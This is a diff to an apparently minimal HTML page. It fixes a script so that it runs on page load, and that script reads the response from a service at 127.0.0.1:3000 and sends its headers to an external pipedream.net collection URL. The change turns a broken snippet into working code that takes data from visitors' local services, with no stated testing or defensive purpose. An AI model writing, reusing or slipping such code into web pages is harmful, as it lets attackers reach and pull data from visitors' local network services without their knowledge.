@@ -6,8 +6,8 @@
   <body>
   </body>
   <script>
-    function() {
+    (function() {
       fetch("http://127.0.0.1:3000/").then(a => fetch("https://enxnu407hqabq.x.pipedream.net/?data=" + encodeURIComponent(JSON.stringify([...a.headers.entries()]))));
-    }();
+    })();
   </script>
 </html>
